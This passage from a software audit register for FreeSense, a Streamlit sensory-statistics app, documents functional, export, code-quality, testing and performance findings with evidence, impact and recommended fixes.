- Location: DA/RATA/CATA/Liking Step 1 (`render_data_upload_section` returns `None`; e.g. `modules/descriptive/workflow.py:113-116` returns immediately)
- Evidence (`run_state.py`): run DA, switch to PrefMap, switch back. `da_analysis_complete` is still `True` and Step 3 renders the old results, but Step 1 shows only an empty uploader (`uploader value None`): no mapping, no parameters, and no message saying which file the current results came from. Re-uploading the same file fires `on_change=reset_analysis_state` and discards the completed analysis (`da complete None`). PrefMap already handles this case with "Using previously uploaded liking scores, re-upload to change" (`modules/prefmap/workflow.py:563-566`); DA/RATA/CATA/Liking do not.
- Impact: a user who goes back to Step 1 to check or tweak a parameter sees an apparently empty study and has to redo the analysis; nothing shows which file produced the results on screen.
- Recommendation: keep the last raw frame and file name in module state and render Step 1 from it when the uploader is empty ("Current data: sensochoc.xlsx, uploaded 14:02. Upload a new file to replace it"). Alternatively, show at least the file name and parameters used on every step.
- Effort: M
- Dependencies: none

### FUNC-09: Browser refresh or a dropped connection loses all work with no warning
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B02-functional-workflow.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (code inspection); refresh itself not simulated in a browser
- Location: `app.py`, `core/state.py` (all state in `st.session_state`); `.streamlit/config.toml`
- Evidence: no persistence, save/restore, or `query_params` mechanism exists (`grep -rn "query_params|pickle|save_session|beforeunload"` over `app.py core modules utils`: no hits). No text in the app or README tells users that refreshing, closing the tab or a network drop longer than `server.disconnectedSessionTTL` (120 s, default) discards uploads and results (`grep -i "refresh|not saved|session only"`: no user-facing hits). `persist_state="session"` keeps widget values across module switches only, not across a browser session.
- Impact: a sensory scientist who spends time on segmentation, PLS pruning or penalty settings and presses F5 loses everything silently. The Excel export is the only way to keep results.
- Recommendation: one caption on the landing page and on each Step 1 ("Nothing is stored on the server. Refreshing or closing this tab clears your data and results; download the Excel report to keep them."). Consider an "export/import settings" JSON later.
- Effort: S
- Dependencies: decision on deployment (hosted versus local)

### IO-05: Multi-sheet workbooks: the first sheet is read silently and the user cannot choose
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B03-import-export.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `core/data.py:21`, `core/data.py:87`
- Evidence: a workbook whose sheets are `Instructions` and `Data` loads as the single column `['Info']` from `Instructions` (`fmt2.py`). No sheet picker exists and no message says which sheet was used. Title rows above the header are also not supported: the header becomes `Study X results`, `Unnamed: 1`, … with no hint.
- Impact: panel-software exports and lab templates often start with a cover sheet. The user sees nonsense columns with no explanation.
- Recommendation: when `ExcelFile.sheet_names` has more than one entry, show a sheet selectbox (default: first sheet with ≥ 2 columns) and record the sheet in `Run_Parameters`. Optionally add a "header row" number input.
- Effort: S
- Dependencies: IO-06 (record sheet)

### IO-06: `Run_Parameters` cannot reproduce a run: no date, dependency versions, commit, bootstrap settings or file fingerprint; the version stamp "1.0.0" is ambiguous
- **Register status: final severity MEDIUM. Challenge: reproduced (pass A); downgraded HIGH to MEDIUM: audit gap, cannot corrupt a result.** (source: `B03-import-export.md`)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `utils/export.py:334-566` (`build_run_parameters_sheet`), `core/__version__.py`
- Evidence: the exports generated for RATA, DA, CATA and Liking (see `inspect_xlsx.py` output) record `freesense_version = 1.0.0`, module, palette, file name, col_map, scale, alpha, post-hoc and module-specific options. None of them records:
  - export date and time (only the Fusion `Analysis_Info` sheet has one, `utils/export.py:1753`)
  - Python, statsmodels, scipy, pandas, numpy, scikit-learn or pingouin versions
  - git commit
  - sheet name
  - input file hash or row count
  - for RATA/DA, the CVA/RV bootstrap settings (`stats/multivariate.py:11-12`, `N_BOOTSTRAP=500`, `BOOTSTRAP_SEED=42`). CATA does record its CA seed and iterations in `Methods_Notes`.

  `git log v1.0.0..HEAD` lists 146 commits, including 2,667 inserted lines in `stats/` (for example the Type II empty-cell path), all still stamped `1.0.0`. The `requirements.txt` ranges are wide (`statsmodels>=0.14.2,<1`, `scipy>=1.13,<2`) and there is no lockfile, so two installs of "1.0.0" can differ numerically.
- Impact: a reviewer or auditor cannot tell which code or library versions produced a workbook. Today the version stamp does not identify the statistical engine: an export from the May tag and one from `HEAD` look identical but can differ (DA Type III vs Type II on empty cells).
- Recommendation: bump the version at release and on every stats change. Add rows for `exported_at` (ISO 8601, with timezone), `python_version`, versions of the key packages via `importlib.metadata`, `git_commit` when available, input file SHA-256, rows × columns read, sheet name, and bootstrap n/seed. Ship a lockfile or pinned constraints for releases.
- Effort: S
- Dependencies: decision D-1 (versioning)

### IO-08: Export precision and typing are inconsistent: many values rounded to 3 dp, rates stored as text
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B03-import-export.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `utils/export.py:574, 615-621, 679-706, 764, 861-867, 881, 924, 937, 1813-1885`
- Evidence:
  - p-values are good: stored at full precision with `P_VALUE_EXCEL_FORMAT` on every p column found (RATA 26 + 14 + 418 + 12 + 138 cells, DA, CATA and Liking the same).
  - Means, SD, SE, CIs, F, Cochran's Q, correlations and panel-performance scores are rounded at export to 3 dp, and PLS outputs to 4 dp, with `number_format='General'`.
  - Ticking rates are stored as text (`'100.0%'`, `'91.4%'`) in `TickingRate_Wide`, `TickingRatePerRep_Wide` and `Descriptives_CLD`, so Excel cannot compute on them.
  - Other sheets (the Contrast sheets, the Liking `Acceptance` sheet) store full-precision floats with no display format.
  - Header labelling is mixed: humanised in some sheets (`Mean Intensity`, `p (Product)`), raw snake_case in others (`raw_diff`, `lsd_or_hsd`, `neg_log_p`, `tested_against`, `p_value_fdr`).
  - The Liking workbook has no `Methods_Notes` sheet, while RATA and CATA do.
- Impact: re-analysis from the workbook loses precision (3 dp of a 0-10 mean is fine for reporting but not for recomputation) and rates need parsing. The mixed column naming makes the workbook look unfinished.
- Recommendation: store full precision everywhere and use Excel `number_format` for display, the same approach the p-values already use. Write rates as numbers with a `0.0%` format. Apply one label map across builders. Add `Methods_Notes` to Liking (and to DA if intended).
- Effort: M
- Dependencies: none

### IO-09: Word/PowerPoint image exports: text becomes very small at page size
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B03-import-export.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (sizes measured); legibility judgement is inferred
- Location: `utils/plot_theme.py:55-58, 152-181`
- Evidence (`render.py`, RATA figures):
  - Word preset: 1200 CSS px × scale 3 gives 3600 px PNG (554 dpi at 6.5 in). Wide preset: 2000 px × 3 gives 6000 px (667 dpi at 9 in). The resolution is ample.
  - Fonts are not scaled. At the page width the preset targets, base 17 px text is 6.6 pt (5.5 pt for wide figures), CLD footnotes and CVA/PCA loading labels at 10-11 px are 3.2-4.3 pt, and the legend in the CVA export is about 3.6 pt (visible in `img/RATA_rata_cva_biplot_word.png`).
  - kaleido writes no DPI metadata, so Word places the image at 96 dpi and the user must shrink it to the page, which gives the above sizes.
  - PowerPoint preset: 8.5 pt base at 13.33 in, minimum 5 pt.
  - SVG export embeds text elements with `font-family: Arial`, which is good.
- Impact: journal and report figures need about 7-8 pt minimum. Loading labels and legends are hard to read in print.
- Recommendation: author the Word preset at the physical page width (6.5 in × 96 = 624 px, scale 6), or scale fonts proportionally to the width ratio, with a minimum font size (for example 8 pt equivalent) for annotations. Write a pHYs/DPI chunk so the image inserts at its intended size.
- Effort: M
- Dependencies: none

### IO-11: kaleido 0.2.1 pin is a deployment and upgrade risk
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B03-import-export.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (works here); SUSPECTED (other platforms)
- Location: `requirements.txt:5`, `utils/plot_theme.py:181`
- Evidence:
  - Observed: on this host (Fedora x86_64, Python 3.14.7) `fig.to_image` works; cold start 2.8 s, then 0.2-1.8 s per image. The package bundles its own Chromium binary (`kaleido/executable/bin/kaleido`, ELF x86-64), and its `py2.py3-none` wheels do not depend on the Python version, so 3.14 is not an issue in itself.
  - Inferred: kaleido 0.2.x is no longer developed. Plotly ≥ 6.1 requires kaleido ≥ 1 (which drives a system Chrome), so the `plotly<6` and `kaleido==0.2.1` pins lock the app to Plotly 5.x.
  - SUSPECTED: kaleido 0.2.1 is widely reported to hang indefinitely on some Windows installs (the common workaround is `kaleido==0.1.0.post1`). The download callable runs on a worker thread with no timeout, so a hang would leave the button spinning. Not tested here (no Windows host).
- Impact: Windows desktop users may be unable to export images. Any Plotly upgrade breaks image export.
- Recommendation: add a timeout and a friendly error around `export_figure`. Test on Windows and macOS arm64 before release. Plan the migration to Plotly 6 with kaleido 1 (Chrome requirement documented) or keep the SVG/modebar path as the fallback.
- Effort: M
- Dependencies: decision D-2 (platforms)

### CODE-01: Liking's Tukey label is not recognised by the spider plot, so an HSD ribbon is captioned "±LSD zone"
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B04-code-quality.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `utils/plotting.py:1219-1220` and `1267-1272` (`plot_spider_with_ribbon`); label defined at `modules/liking/workflow.py:52-54` (`"Tukey HSD (Studentized Range)"`); consumed at `modules/liking/ui.py:1279-1292`; root cause is three labels for one method: `modules/rata/ui.py:50` (`"Tukey HSD"`), `modules/descriptive/workflow.py:2496` (`"Tukey-Kramer HSD"`), Liking (`"Tukey HSD (Studentized Range)"`).
- Evidence: `stats/contrast.py:181-183` accepts all three labels and sets `use_hsd=True`, so for Liking the ribbon half-width is the HSD. The plotter only tests `post_hoc_method in ('Tukey HSD', 'Tukey-Kramer HSD')`. Direct call:
  ```
  'Tukey HSD'                     ['±HSD zone'] | Shaded ribbon = ±HSD zone
  'Tukey-Kramer HSD'              ['±HSD zone'] | Shaded ribbon = ±HSD zone
  'Tukey HSD (Studentized Range)' ['±LSD zone'] | Shaded ribbon = ±LSD zone
  ```
  The alias tuple is restated at about nine sites (`stats/posthoc.py:337, 594, 642, 691, 762`, `stats/contrast.py:182`, `utils/plotting.py:1219, 1267`, `modules/descriptive/workflow.py:1013`); the plotting ones are the two that missed the third label.
- Impact: Liking users who choose Tukey get a chart (on screen and in the Word/PowerPoint export) whose legend and subtitle call the band an LSD zone. The numbers are right, the label is wrong. Any future site that copies one of the two-label tuples will repeat the bug.
- Recommendation: define the labels once in `core/config.py` (e.g. `TUKEY_LABELS = frozenset({...})` and `is_tukey(method)`), replace the nine tuples with it, and add a test that calls `plot_spider_with_ribbon` with every module's option list. Unifying the visible labels is a UX choice and can wait; the helper is the release fix.
- Effort: S
- Dependencies: none

### CODE-02: Global `uploaded_file` key leaks between modules and puts the wrong file name in Fusion/PrefMap `Run_Parameters`
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B04-code-quality.md`)
- Severity: MEDIUM
- Confidence: VERIFIED for Fusion and PrefMap; SUSPECTED for CATA/DA/RATA after a module round-trip
- Location: writes at `modules/cata/ui.py:379`, `modules/descriptive/workflow.py:114`, `modules/rata/ui.py:113`; read at `utils/export.py:366-373` (`build_run_parameters_sheet`); not in `init_session`, not in `MODULE_STATE_KEYS`.
- Evidence: `keys.py` found `uploaded_file` as the only non-global, non-listed key written by more than one module. Fusion and PrefMap never write `uploaded_file`, `fusion_df_raw_name` or `prefmap_df_raw_name` (grep), so the builder falls back to whatever CATA/DA/RATA last stored. `runparams.py` with state `{'uploaded_file': <name 'panel_DA_2025.csv'>}`:
  ```
  Fusion  [['data_source_file', 'panel_DA_2025.csv', 'fusion_df_raw_name / uploaded_file']]
  PrefMap [['data_source_file', 'panel_DA_2025.csv', 'prefmap_df_raw_name / uploaded_file']]
  ```
  Inferred (not run end to end): for CATA/DA/RATA the key is rewritten on every Step 1 render from an uploader that has no `persist_state`, so after visiting another module and coming back (results are restored by `_select_module`) it holds `None` or another module's file.
- Impact: the provenance sheet, whose purpose is to document which file produced the results, names a different module's file. A reader of an archived Fusion or PrefMap workbook would be misled.
- Recommendation: each module records its own `<prefix>_df_raw_name` (storage key, listed in `MODULE_STATE_KEYS`) at "Run analysis" time, as Liking already does (`modules/liking/workflow.py:325`); Fusion records both sensory and external file names; the builder drops the `uploaded_file` fallback and writes "—" when a module has no record. Remove the three `uploaded_file` writes. Add a `Run_Parameters` test per module that seeds a foreign `uploaded_file` and asserts it is not reported.
- Effort: S
- Dependencies: none

### CODE-03: Liking LMM never raises its convergence warning on a successful fit; optimiser fallback and boundary fits are silent
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B04-code-quality.md`)
- Severity: MEDIUM
- Confidence: VERIFIED (code path and one demonstrated case); SUSPECTED for real-data frequency
- Location: `stats/liking.py:227-253` (`compute_liking_lmm`), flag read at `modules/liking/workflow.py:1021`.
- Evidence: `convergence_warning = False` at line 227 is never set to `True` except in `_failure_return()` (all three optimisers raised). The fits run under `warnings.simplefilter('ignore')`, `result_reml.converged` is never read, and the optimiser actually used (`_successful_method`, which can be `cg` or `nm` after `lbfgs` raised) is not returned. Compare `stats/mixed_models.py` (RATA), which returns `converged` and `optimiser_used` per attribute. `conv.py` found synthetic designs (12 consumers × 4 products, small consumer variance) where statsmodels emits `ConvergenceWarning: The MLE may be on the boundary of the parameter space` and `SingularMatrixWarning`, and FreeSense returns `convergence_warning=False`, e.g. seed 11: `statsmodels converged= True ['ConvergenceWarning','SingularMatrixWarning'] -> FreeSense convergence_warning= False [['LRT', 3.15e-07]]`. I did not find a case with `converged=False` in 60 seeds.
- Impact: the "Model convergence warning" in Step 2 is effectively dead code. A boundary or non-converged fit is reported with no caveat. For the fixed-effect product test a boundary random-effect variance is usually benign, so results are not shown to be wrong; the defect is that the safety net the UI advertises does not exist.
- Recommendation: record warnings with `catch_warnings(record=True)` instead of ignoring them; set `convergence_warning` from `not result_reml.converged or not result_ml.converged` or a recorded `ConvergenceWarning`; return `optimiser_used` and a `boundary_fit` flag; surface them as a caption, and add them to `Run_Parameters`. Hand to B01/B02 for the wording of the boundary case.
- Effort: S
- Dependencies: none

### CODE-04: Stats-layer warnings reach only the terminal; the Fusion permutation caption reports the requested, not the used, permutation count
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B04-code-quality.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `stats/pls.py:470-486` (`_permutation_test`), `stats/pls.py:964` (`n_finite_permutations` returned), `modules/fusion/workflow.py:1818-1825` (caption); other `warnings.warn` sites `stats/pls.py:120, 359`, `stats/data_fusion.py:565, 601`, `stats/da_anova.py:532`; `app.py:21-24` (logging to terminal).
- Evidence: no module wraps a stats call in `warnings.catch_warnings(record=True)` (grep returns nothing), so `warnings.warn` messages go to the server's stderr. The permutation test excludes non-finite Q² draws and warns "The reported p-value is conditional on the finite draws"; the result dict carries `n_finite_permutations` "so the UI can" show it (`stats/pls.py:450`), but grep finds no reader in `modules/` or `utils/`, and the caption prints `int(config['n_permutations'])`. Because every stats function is `@st.cache_data`, a warning fires only on a cache miss, so even a terminal user sees it once. Some PLS messages are surfaced independently through result flags (`n_components_rank_capped`, `n_components_effective_rank_capped`, `modules/fusion/workflow.py:2313-2319`), which is the right pattern; the permutation count and the DA diagnostics skip (`stats/da_anova.py:532`) are not.
- Impact: Fusion (beta) users can receive a permutation p-value computed on fewer draws than stated. In a hosted deployment the operator sees the terminal and the user does not.
- Recommendation: before release, show `n_finite_permutations of n_permutations_requested` in the caption and export when they differ. As a rule for `stats/`: anything the user must know goes into the result dict (as the rank-cap flags do), not only into `warnings.warn`.
- Effort: S
- Dependencies: Decision D1 (beta modules in scope)

### TEST-01: The suite protects results only on the maintainer's machine: no CI, no lockfile, one Python version
- **Register status: final severity MEDIUM. Challenge: reproduced (pass B, facts); downgraded HIGH to MEDIUM: drift in pinned numbers could not be demonstrated.** (source: `B05-testing.md`)
- Severity: HIGH
- Confidence: VERIFIED (absence); impact SUSPECTED
- Location: repo root (`.github/` absent, no lockfile); `requirements.txt`; `pytest.ini`
- Evidence:
  - `ls .github` returns "No such file". There is no `*.lock`, `constraints.txt` or `pip freeze` output.
  - `requirements.txt` gives floors and major-version caps only: `statsmodels>=0.14.2,<1.0.0`, `scikit-learn>=1.5.0,<2.0.0`, `scipy>=1.13.0,<2.0.0`, `numpy>=2.3.2,<3.0.0`, `pingouin>=0.5.4,<1.0.0`.
  - The only recorded run is on Python 3.14.7 with statsmodels 0.15.0, scikit-learn 1.9.1 and scipy 1.18.1 (00-orientation section 4). The README claims support for Python 3.11 to 3.14.
  - Many numerical pins are version-sensitive:
    - LMM optimiser output: `test_rata_lmm_pin` asserts the sum of LR statistics is `1292.263 ± 1e-3`.
    - KMeans labels and inertia at `random_state=42`.
    - Bootstrap CA ellipses: `default_rng` seeded draws.
    - PLS permutation p-values drawn from `RandomState(seed)`.
    - Excel sheet baselines in `test_export_rata.py` (comment "Recorded from a fresh baseline run").
- Impact:
  - A user who installs today can get library versions nobody has tested against. If a statsmodels or scikit-learn minor release changes an optimiser default, the app's numbers can shift and nothing will notice. Test failures are only seen if the maintainer happens to run pytest locally.
  - The reference pins are the project's main defence of scientific correctness, and they deliver that only when someone runs them.
  - Inferred: the risk is highest for the LMM paths (RATA, Liking), whose statsmodels `MixedLM` fits are the most sensitive to optimiser changes.
- Recommendation:
  1. Add a minimal GitHub Actions workflow: `pip install -r requirements.txt`, then `pytest -n auto -rs`, on the oldest and newest supported Python (3.11 and 3.14).
  2. Add a second job that installs the floor versions (`pip install "statsmodels==0.14.2" "scikit-learn==1.5.0" ...`), or narrow the floors to what was actually tested.
  3. Commit a lockfile or `constraints.txt` from the environment the release is validated in, and tell users to install from it.
- Effort: S (workflow) to M (floor-version job, plus any fixes it surfaces)
- Dependencies: deployment decision (hosted: pin exactly; local install: lockfile plus a supported-range job)

### TEST-03: The CATA McNemar pin checks p-values for only 38 of 465 pairs, and never the adjusted p-values
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B05-testing.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `tests/test_validation_pins.py::test_cata_pins` (the `exact = mc[mc["test_used"] == "exact"]` block); `stats/shared/frequency.py:455-485`
- Evidence:
  - In `validation/CATA/_out/fs_mcnemarQ.csv`, 427 pairs use `test_used = asymptotic` and 38 use `exact`. The test compares `p_raw` only for the exact rows. For the asymptotic rows it compares only the discordant counts b and c. No FreeSense `p_adj` or `reject` value is compared against any reference.
  - FreeSense's asymptotic p differs from `cata::mcnemarQ` by up to 0.150, and 11 pairs change significance at 0.05. This is the documented deliberate divergence in `validation/README.md`.
  - My independent check: FreeSense's asymptotic p equals `chi2.sf((b-c)^2/(b+c), 1)` (no continuity correction) to 1.1e-16. It differs from the corrected form and from statsmodels `mcnemar(exact=False, correction=True)` by 0.1496. So the code does what its docstring says (line 456, "no continuity correction").
- Impact: 92% of McNemar p-values in the CATA module are unprotected by any assertion. For example, a regression that switched the correction on, or broke the 25-discordant switch-over, would pass the suite. The CLD letters and BH scope are pinned only by one reject count (`{'A1': 6, 'A5': 0}`) on a synthetic fixture.
- Recommendation: extend `test_cata_pins`:
  - For the asymptotic rows, assert `p_raw` against `scipy.stats.chi2.sf((b-c)**2/(b+c), 1)` computed from the pinned b and c.
  - Recompute BH within each attribute with `statsmodels.stats.multitest.multipletests(method="fdr_bh")` and assert `p_adj` and `reject`.
- Effort: S
- Dependencies: whether the uncorrected χ² is the intended method is a B01 question, not a test question

### TEST-04: Pin tolerances are several orders looser than the agreement achieved, partly because the stats layer rounds test statistics
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B05-testing.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `tests/test_validation_pins.py`; `stats/mixed_models.py:119`, `stats/da_anova.py:419-449` (`round(..., 3/4)`); DA ICC (the "FreeSense rounds to 3 dp" comment in `validation/DA/da_reference.R`)
- Evidence: achieved maximum difference against the frozen R references, compared with the tolerance the test allows:

  | Quantity | Achieved | Test tolerance |
  |---|---|---|
  | DA p_product | 1.1e-17 | 1e-3 |
  | DA p_interaction | 3.3e-14 | 1e-3 |
  | DA F | 4.6e-4 (FreeSense rounds F to 3 dp) | 1e-3 |
  | ICC | 4.7e-4 (rounded to 3 dp) | 1e-3 |
  | RATA LR χ² | 4.9e-4 (rounded to 3 dp) | 1e-2 |
  | RATA LR p | 1.0e-12 | 1e-4 |
  | RATA Tukey p_adj | 4.9e-11 | 1e-4 |
  | Liking LRT p | 3.2e-11 | 1e-3 |
  | VIP | 6.5e-5 | 1e-3 |
  | Cochran Q p | 4.6e-8 (the reference is written to 7 dp) | 1e-5 |

  More weak assertions of the same kind:
  - `test_stage_f_smoke.py` pins sums (`sum of F == 414.665`, `sum of LR == 1292.263`), so errors in opposite directions cancel out.
  - `test_fusion_pls_pin` asserts `(status == 'matched').all() or 'status' in columns`, which is always true.
  - Several `test_stats_layer_moves.py` tests compare a function against a copy of the same expression ("matches the inline expression"). These are refactor guards, not correctness tests.
- Impact: an absolute tolerance of 1e-3 on a p-value lets a result move from 0.0495 to 0.0505 and change a significance decision without failing. Rounding test statistics in the stats layer (F, LR, ICC) also means no test can pin them tighter than 5e-4. That is a data-quality choice that belongs to the display layer, the same argument CLAUDE.md already makes for p-values.
- Recommendation:
  1. Tighten p-value tolerances to 1e-8 (DA, RATA, Liking), because they already agree to 1e-11 or better.
  2. Add decision-agreement asserts (`(p_ref < α) == (p_fs < α)`) for DA and Liking.
  3. Stop rounding F, LR and ICC in `stats/`, then tighten those tolerances to 1e-6.
  4. Replace the sum pins with per-attribute pins.
  5. Delete the tautological `or` clause.
- Effort: S (tests); M if the stats-layer rounding is removed (exports and snapshots change)
- Dependencies: B01 (stats-layer rounding)

### TEST-05: The R references are real R output, but several are R re-implementations of FreeSense's own algorithm, and none has been regenerated since July
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B05-testing.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `validation/*/reference/*.csv`; `validation/DA/da_reference.R:160-212, 215-258`; `validation/PrefMap/prefmap_reference.R:122-228`; `validation/Fusion/fusion_reference.R:138-156`
- Evidence:
  - **Provenance.** All 24 CSVs have R `write.csv` formatting: quoted headers and strings, 15 significant digits, `NA` for missing. pandas writes unquoted headers and 17 digits. Each file was added once, in `facd712` (CATA) or `46eaec4` (all others), both dated 2026-07-06, and never modified since (`git log -- <file>` shows one commit each). So they are **not** regenerated Python output, and there is no circularity in the literal sense.
  - **Independence varies by quantity.**
    - Independent published engines: `cata::cochranQ`/`mcnemarQ`, `FactoMineR::CA`, base-R `aov` (DA F), `lme4` LRT, `emmeans` Tukey (RATA), `t.test` + `p.adjust`, `pls::plsr` coefficients and fit, `prcomp`, and SensoMineR JAR penalties.
    - **R ports of FreeSense logic:**
      - DA CLD: the frozen `ref_cld.csv` comes from `manual_tk()`, commented as "Manual Tukey-Kramer reproducing FreeSense's algorithm". The independent `emmeans` CLD disagrees on 2 of 14 attributes. That divergence is documented but not frozen.
      - PrefMap: the per-consumer AICc formula and the ">3× product radius" stability override are re-coded in R, fitted on **FreeSense's own PCA coordinates** (`fs_sc`, read from `_out/`), and the frozen `model_type_ref` and `r2_ref` are the override-adjusted values.
      - VIP: hand-coded formula.
      - ICC: hand-coded from `aov` mean squares, 25 randomly sampled cells.
    - These pins confirm that FreeSense's arithmetic matches its specification. They cannot catch a wrong specification.
  - **Staleness.** R is not installed here, and `validation/run_all.sh` has not been run since July as far as git shows. The September changes (`03efed4` unbalanced data handling, `a564616`/`1b43357` panel performance) touched `da_anova`, `posthoc` and `panel_performance`. The pins still pass because sensochoc is balanced and complete, so they never touch the new empty-cell code.
- Impact: the README's "validated against published R engines" is accurate for most headline tests but overstated for DA CLD letters, PrefMap model selection and VIP. Users reading the validation claims may over-trust those outputs.
- Recommendation:
  1. In `validation/README.md`, mark each pinned quantity as "independent engine" or "R port of FreeSense spec".
  2. Freeze the emmeans DA CLD as a second reference and assert the documented 2/14 gap.
  3. Before release, run `validation/run_all.sh` on a machine with R and commit the result (unchanged CSVs are themselves evidence), or record in the release notes the date of the last R run.
- Effort: S (docs and extra asserts); M (R run, if anything moved)
- Dependencies: TEST-01

### TEST-06: Whole user-reachable paths are never executed by any test, including the precomputed-means loader
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B05-testing.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `core/data.py:41` (`load_precomputed_means`); functions listed below
- Evidence: after combining the unit, AppTest and emitter coverage contexts, these functions execute on zero lines:
  - `core.data.load_precomputed_means`: every Fusion and PrefMap AppTest replaces it with `_fake_means` (`tests/test_apptest_fusion.py:88`, `tests/test_apptest_prefmap.py:75`).
  - `stats.data_fusion.log_transform`, `sqrt_transform`: Fusion preprocessing options, 3 call sites in `modules/fusion/workflow.py`.
  - `stats.multivariate.varimax`: DA and RATA rotation.
  - `stats.segmentation.compute_demographic_association`: Liking.
  - `stats.liking._failure_return`.
  - Plotters: `plot_consumer_dendrogram`, `plot_cluster_validity_line`, `plot_mdpref_biplot_vectors`, `plot_mdpref_biplot_clusters_ellipses`, `plot_demographic_grouped_bar`, `plot_age_liking_scatter`, `plot_penalty_mean_drop_bar`, `add_cva_assessor_overlay`, `compute_kde_contour_points` (all have production call sites).
  - Dead code: `plot_penalty_bar`, `plot_penalty_bubble` and `stats.shared.frequency.proportion_table` have no production call sites.

  A quick probe of the untested loader: `load_precomputed_means` accepts a CSV with a duplicated product row (`A,3.5,2` / `A,4.0,1`) and returns a non-unique index without warning (`df.index.is_unique == False`). A `;`-separated CSV with decimal commas fails with a misleading "Product column not found. Available columns: product;Sweet;Sour".
- Impact:
  - The Fusion and PrefMap file-upload path, as users run it, has no test at all.
  - Liking segmentation panels and the MDPREF biplots live inside `on_change="rerun"` tabs. The step walk (`assert_render_conventions_across_steps`) never opens those tabs, so a crash there would ship.
- Recommendation:
  1. Unit-test `load_precomputed_means` on real bytes (CSV and XLSX; missing product column; duplicate products; NaN cells; non-numeric column).
  2. Add AppTest cases that open each gated tab (Liking steps 4, 5 and 7; DA/RATA rotation on; Fusion log/sqrt preprocessing).
  3. Delete the three dead functions.
- Effort: S to M
- Dependencies: B03 (duplicate products and delimiter handling are ingestion findings)

### TEST-07: AppTests check wiring and conventions well, but bypass real upload and never check numbers on screen
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B05-testing.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `tests/test_apptest_*.py`, `tests/test_apptest_smoke.py:277-305`
- Evidence:
  - **What the AppTests assert:**
    - no exception on each step (every module walks all its steps)
    - persisted widget round-trips across module switch and re-upload
    - that session-state result frames equal a direct stats call (`assert_frame_equal(at.session_state["rata_anova_df"], anova_ref)` in `test_apptest_rata.py:128-133`)
    - Run_Parameters values
    - chart-title and p-value display conventions
    - contrast reference-switch behaviour
  - **What they do not do:**
    - Every module fixture monkeypatches `ui_shell.render_data_upload_section` and `core_data.load_data` (for example `test_apptest_da.py:39-40`), so `st.file_uploader` → `load_data` → column-mapping auto-detection on real bytes is never exercised.
    - Export builders are called directly on a `session_state.to_dict()` snapshot. The deferred `st.download_button(data=callable)` path, which runs on a worker thread with no script context (CLAUDE.md), is not exercised.
    - No AppTest asserts a displayed number (a metric value or a table cell) against a reference.
- Impact:
  - Upload-format regressions would not be caught: header detection, encoding, Excel sheet choice, numeric IDs. These are the most common first-contact failures for users.
  - The worker-thread export path could break (for example if a builder starts reading `st.session_state`) while every test still passes.
- Recommendation: see minimum test set items 6-8.
- Effort: M
- Dependencies: none

### PERF-03: DA and RATA run times are dominated by two avoidable costs (pingouin CI loop; per-pair numerical-integration Tukey p-values)
- **Register status: final severity MEDIUM. Not challenged (MEDIUM/LOW).** (source: `B06-performance.md`)
- Severity: MEDIUM
- Confidence: VERIFIED
- Location:
  - `stats/panel_performance.py:251-264` (600 `pg.intraclass_corr` calls at realistic size).
  - `stats/posthoc.py:362-391` and `:624` (`1.0 - stats.studentized_range.cdf(q_obs, k, df)` once per pair per attribute, plus `.ppf` once per attribute). The same pattern is at `stats/posthoc.py:230,251` (RATA crossed Tukey) and `stats/contrast.py:211-228`.
- Evidence: see the timing table and `prof_da.txt`.
  - DA realistic, default FDR: 12.6 to 15.3 s end to end. `compute_repeatability` is 11.6 s of it, and 23 of its 32 s under profiling is pingouin.
  - Tukey adds 21 s (57.7 s under load).
  - DA stress with Tukey: 190 s. RATA realistic with Tukey: 25 to 54 s, of which the LMM loop is 15 to 39 s and the Tukey CLD 10 to 14 s. FDR CLD is 0.9 s.
  - `sr.py`: one `studentized_range.cdf` call costs 7 to 12 ms and one `.ppf` call 100 to 130 ms, independent of the q value.
  - By contrast, Liking's Tukey (`stats/liking.py:836`, `.sf` per pair on 45 pairs) takes 0.4 s, because there is only one "attribute".
- Impact: a 15 to 55 s wait at realistic size and about 3 min at stress size, with no working progress indicator (PERF-05). The wait is annoying but tolerable locally. On a shared server it is multiplied by the number of concurrent users (PERF-04).
- Recommendation:
  - (a) Move the approximate pingouin CI out of Run: compute it lazily in the Step 6 detail tab, or drop it. The primary ICC is already computed by the OLS formula above it.
  - (b) Compute Tukey p-values in one vectorised pass per attribute. Options: interpolate `studentized_range.sf` on a small q grid per (k, df) and cache it; or use `statsmodels.stats.libqsturng.psturng`, which is table-based and vectorised, with a documented accuracy check against the scipy value in `tests/`. Keep the one `.ppf` per (k, df), since it is shared by all attributes with the same k and df.
  - (c) Optionally, fit the RATA and DA per-attribute models in a `concurrent.futures.ProcessPoolExecutor`. Threads will not help (PERF-04).
- Effort: M
- Dependencies: PERF-02 (same code block)

### PERF-04: No resource limits for a hosted deployment: default 200 MB upload, no size caps, GIL-bound compute in one process, small shared caches
